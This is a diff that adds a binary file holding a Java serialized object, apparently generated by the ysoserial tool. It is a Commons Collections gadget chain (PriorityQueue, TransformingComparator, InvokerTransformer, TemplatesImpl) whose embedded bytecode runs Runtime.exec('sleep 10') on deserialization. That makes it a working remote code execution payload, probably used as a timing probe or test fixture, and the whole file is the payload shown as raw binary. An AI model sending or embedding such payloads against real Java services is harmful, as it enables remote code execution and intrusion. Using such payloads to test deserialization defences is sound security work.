@@ -1,0 +1,43 @@
+??srjava.util.PriorityQueue??0?????IsizeL
+comparatortLjava/util/Comparator;xpsrBorg.apache.commons.collections4.comparators.TransformingComparator/???+?L	decoratedq~L
+                                                                                                                            transformert-Lorg/apache/commons/collections4/Transformer;xpsr@org.apache.commons.collections4.comparators.ComparableComparator???%?n?7xpsr;org.apache.commons.collections4.functors.InvokerTransformer???k{|?8[iArgst[Ljava/lang/Object;L
+                                                                                                                                                          iMethodNametLjava/lang/String;[
+                                                                                                                                                                                         iParamTypest[Ljava/_indentNumberI_transletIndex[ject;??X?s)lxptnewTransformerur[Ljava.lang.Class;?׮??Z?xpwsr:com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl	WO?n??3I
+_bytecodest[[B[_classq~
+                       L_nameq~
+L_outputPropertiestLjava/util/Properties;xp????ur[[BK?gg?7xpur[B??T?xp?????29
+ConstantValue? ????><init>()VCodeLineNumberTableLocalVariableTablethisStubTransletPayload
+                                                                                         InnerClasses5Lysoserial/payloads/util/Gadgets$StubTransletPayload;	transformr(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)document-Lcom/sun/org/apache/xalan/internal/xsltc/DOMhandlersB[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;
+Exceptions'?(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)iterator5Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;handlerALcom/sun/org/apache/xml/internal/serializer/SerializationHandler;
+SourceFile
+          Gadgets.java
+
+
+(3ysoserial/payloads/util/Gadgets$StubTransletPayload@com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTransletjava/io/Serializable9com/sun/org/apache/xalan/internal/xsltc/TransletExceptionysoserial/payloads/util/Gadget<clinit>java/lang/Runtime*
+getRuntime()Ljava/lang/Runtime;
+                               ,-
++sleep 10exec'(Ljava/lang/String;)Ljava/lang/Process;
+                                                     23
+StackMapTableysoserial/Pwner663353077681508 Lysoserial/Pwner663353077681508;!
+
+
+/*??
+ 8
+4 8?
+8*)?
+
+   $?L?/1?5W?6 !
+#	uq~?????2
+ConstantValueq?i?<mG<init>()VCodeLineNumberTableLocalVariableTablethisFoo
+                                                                         InnerClasses%Lysoserial/payloads/util/Gadgets$Foo;
+SourceFile
+          Gadgets.java
+
+
+#ysoserial/payloads/util/Gadgets$Foojava/lang/Objectjava/io/Serializableysoserial/payloads/util/Gadgets!
+
+
+<*??
+
+	ptPwnrpwxsrjava.lang.Integer⠤???8Ivaluexrjava.lang.Number???
+                                                                    ???xpx%  
